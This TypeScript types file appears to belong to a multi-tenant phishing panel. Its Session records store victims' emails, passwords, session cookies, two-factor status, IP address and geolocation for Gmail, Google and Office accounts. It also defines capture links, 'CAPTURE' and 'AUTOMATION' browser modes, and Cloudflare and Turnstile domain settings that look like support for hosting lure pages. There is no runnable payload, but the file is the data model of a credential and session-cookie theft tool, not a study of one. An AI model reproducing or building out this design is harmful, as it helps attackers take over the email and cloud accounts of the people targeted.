export interface User {
  id: string;
  email: string;
  name: string;
  role: "ADMIN" | "CUSTOMER";
  tenantId: string | null;
  createdAt: string;
}

export interface Domain {
  id: string;
  domain: string;
  subdomain: string | null;
  status: string;
  sslStatus: string | null;
  dnsStatus: string | null;
  turnstileSiteKey: string | null;
  cloudflareAccount?: {
    nameserver1: string;
    nameserver2: string;
    name: string;
  };
  createdAt: Date;
}

export interface Session {
  id: string;
  email: string;
  username?: string | null;
  password?: string | null;
  provider: "GMAIL" | "GOOGLE" | "OFFICE";
  status: "PENDING" | "AUTHENTICATED" | "FAILED" | "EXPIRED";
  cookies: string | null;
  metadata: string | null;
  browserMode: "CAPTURE" | "AUTOMATION";
  domainUsed: string | null;
  ipAddress?: string | null;
  userAgent?: string | null;
  browser?: string | null;
  timezone?: string | null;
  country?: string | null;
  region?: string | null;
  city?: string | null;
  isp?: string | null;
  connectionType?: string | null;
  twoFactorEnabled?: boolean;
  createdAt: Date;
  lastVerifiedAt: Date | null;
}

export interface Provider {
  id: string;
  name: string;
  type: string;
  location: string;
  status: string;
  sessionCount: number;
  latency: number;
  uptime: number;
  host?: string;
  port?: number;
}

export interface Profile {
  id: string;
  name: string;
  email: string;
  provider: "GOOGLE" | "OFFICE" | "GITHUB";
  status: "active" | "inactive";
  sessionCount: number;
  lastUsed: Date;
  createdAt: Date;
}

export interface DashboardMetrics {
  totalSessions: number;
  activeSessions: number;
  pendingSessions: number;
  failedSessions: number;
  successRate: number;
  avgDuration: number;
}

export interface CaptureLink {
  id: string;
  captureUrl: string;
  provider: "GMAIL" | "GOOGLE" | "OFFICE";
  status: string;
  expiresAt: Date;
  createdAt: Date;
}
